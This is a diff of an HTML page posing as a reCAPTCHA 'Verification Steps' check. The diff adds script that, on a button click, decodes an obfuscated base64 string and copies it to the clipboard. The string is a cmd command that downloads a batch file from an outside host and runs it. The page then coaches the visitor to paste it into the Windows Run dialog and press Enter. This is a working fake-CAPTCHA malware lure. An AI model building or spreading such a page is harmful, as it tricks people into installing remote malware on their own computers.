@@ -6,105 +6,120 @@
 <title>Verification Steps</title>
 <style>
     body {
+        background-color: #f0f0f0;
         font-family: Arial, sans-serif;
-        background-color: #f2f2f2;
-        margin: 0;
-        padding: 0;
     }
     .container {
-        max-width: 600px;
+        background-color: white;
+        width: 520px;
         margin: 50px auto;
-        background: #ffffff;
         border-radius: 8px;
-        box-shadow: 0 0 15px rgba(0,0,0,0.3);
+        box-shadow: 0px 4px 10px rgba(0,0,0,0.1);
+        padding: 0;
         overflow: hidden;
     }
     .header {
-        background: #276ef1;
+        background-color: #3f51b5;
         color: white;
+        padding: 15px;
         text-align: center;
-        padding: 20px 10px;
-        font-size: 26px;
+        font-size: 22px;
         font-weight: bold;
-        line-height: 1.4;
+    }
+    .header span {
+        display: block;
+        font-size: 26px;
     }
     .content {
-        padding: 25px 30px;
-        font-size: 18px;
+        padding: 20px;
+        font-size: 16px;
         color: #333;
-    }
-    .content h2 {
-        color: #276ef1;
-        font-size: 24px;
-        text-align: center;
-        margin-top: 0;
-        margin-bottom: 20px;
-    }
-    .steps {
-        margin: 20px 0;
         line-height: 1.6;
     }
-    .steps p {
-        margin: 10px 0;
+    .content b {
+        font-weight: bold;
+    }
+    .step {
+        margin-bottom: 12px;
+    }
+    .keyboard-img {
+        height: 20px;
+        vertical-align: middle;
+        margin: 0 5px;
     }
     .verify-btn {
         display: block;
-        width: 100%;
-        background: #276ef1;
+        width: 80%;
+        margin: 20px auto;
+        padding: 12px;
+        background-color: #2979ff;
         color: white;
+        font-size: 16px;
+        font-weight: bold;
         border: none;
-        padding: 15px;
         border-radius: 6px;
         cursor: pointer;
-        font-size: 20px;
-        font-weight: bold;
-        margin-top: 20px;
     }
     .verify-btn:hover {
-        background: #1a4cb0;
+        background-color: #1565c0;
     }
-    .check {
-        margin-top: 20px;
-        font-size: 16px;
-        color: #444;
-        line-height: 1.5;
+    .checkbox {
+        margin-top: 10px;
+        font-size: 14px;
     }
-    .check span {
-        color: green;
-        font-weight: bold;
+    .checkbox input {
+        vertical-align: middle;
     }
 </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="header">Complete these<br>Verification Steps</div>
+    <div class="header">
+        Complete these
+        <span>Verification Steps</span>
+    </div>
     <div class="content">
-        <h2>Verification Steps</h2>
         <p>To better prove you are not a robot, please:</p>
-        <div class="steps">
-            <p>1. Click the <strong>"VERIFY (Copy Code)"</strong> button below.</p>
-            <p>2. Press & hold the <strong>Windows Key ⊞</strong> + R</p>
-            <p>3. In the verification window, press <strong>Ctrl + V</strong></p>
-            <p>4. Press <strong>Enter</strong> on your keyboard to finish.</p>
+        <div class="step">1. Click the "<b>VERIFY (Copy Code)</b>" button below.</div>
+        <div class="step">2. Press &amp; hold the Windows Key <img src="https://upload.wikimedia.org/wikipedia/commons/f/f3/Windows_logo_-_2021.svg" class="keyboard-img" alt="Windows Key"> + R</div>
+        <div class="step">3. In the verification window, press <b>Ctrl</b> + <b>V</b></div>
+        <div class="step">4. Press <b>Enter</b> on your keyboard to finish.</div>
+
+        <div class="checkbox">
+            <input type="checkbox" checked> Perform the steps above to finish verification<br>
+            I am not a robot - reCAPTCHA verification ID: 2001
         </div>
-        <div class="check">
-            ✅ Perform the steps above to finish verification<br>
-            I am not a robot - reCAPTCHA verification ID: <strong>2001</strong>
-        </div>
-        <button class="verify-btn" onclick="copyCode()">VERIFY (Copy Code)</button>
+        <button id="decodeButton" class="verify-btn">VERIFY (Copy Code)</button>
     </div>
 </div>
 
 <script>
-function copyCode() {
-    const copyText = "ABC123-XYZ"; // Code cần copy
-    navigator.clipboard.writeText(copyText).then(() => {
-        alert("✅ Code đã được copy: " + copyText);
-    }).catch(err => {
-        alert("❌ Lỗi khi copy code: " + err);
+document.addEventListener("DOMContentLoaded", function() {
+    function decodeBase64(base64String) {
+        try {
+            return decodeURIComponent(escape(atob(base64String)));
+        } catch (error) {
+            console.error("Decode error", error);
+        }
+    }
+
+    function decodeBase64AndCopy(base64String) {
+        const decodedText = decodeBase64(base64String);
+        if (decodedText) {
+            navigator.clipboard.writeText(decodedText).then(() => {
+                alert("Copied clipboard!");
+            }).catch(err => {
+                console.error("Clipboard error", err);
+            });
+        }
+    }
+
+    document.getElementById("decodeButton").addEventListener("click", function() {
+        const base64String = "Y21kIC9jICJjdXJsIGh0dHBzOi8vc2VhbGluZ3Nob3AucHJvL3YyL2JhdC9lbmNvZGUvcm9zZV9lbi50eHQ/cT0yODQ4Mjg4MTg4Mjk0MCAtbyBDOlxVc2Vyc1xQdWJsaWNcbGlicy5iYXQgJiYgY2FsbCBDOlxVc2Vyc1xQdWJsaWNcbGlicy5iYXQi";
+        decodeBase64AndCopy(base64String);
     });
-}
+});
 </script>
 
 </body>
